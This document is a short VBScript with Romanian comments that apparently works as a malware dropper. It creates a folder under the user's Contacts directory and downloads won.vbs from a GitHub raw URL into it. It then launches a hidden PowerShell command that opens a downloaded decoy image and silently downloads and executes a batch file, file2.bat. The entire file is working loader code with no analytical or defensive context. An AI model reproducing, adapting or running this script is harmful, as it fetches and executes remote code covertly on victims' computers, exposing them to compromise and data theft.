Dim shell, fso, appDataPath, targetFolder, xmlHttp

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Obține calea către directorul țintă
targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"

' Asigură-te că directorul țintă există
If Not fso.FolderExists(targetFolder) Then
    fso.CreateFolder(targetFolder)
End If

' Descarcă fișierul won.vbs de pe GitHub
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/won.vbs", False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    ' Salvează fișierul descărcat
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xmlHttp.ResponseBody
    stream.SaveToFile targetFolder & "\won.vbs", 2
    stream.Close
End If

' Rulează comanda PowerShell pentru imagine și alte fișiere
shell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/image.png' -OutFile $env:TEMP\image.png; Start-Process $env:TEMP\image.png; Start-Sleep -Seconds 2; Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file2.bat' -OutFile $env:TEMP\file2.bat; Start-Process $env:TEMP\file2.bat""", 0, False
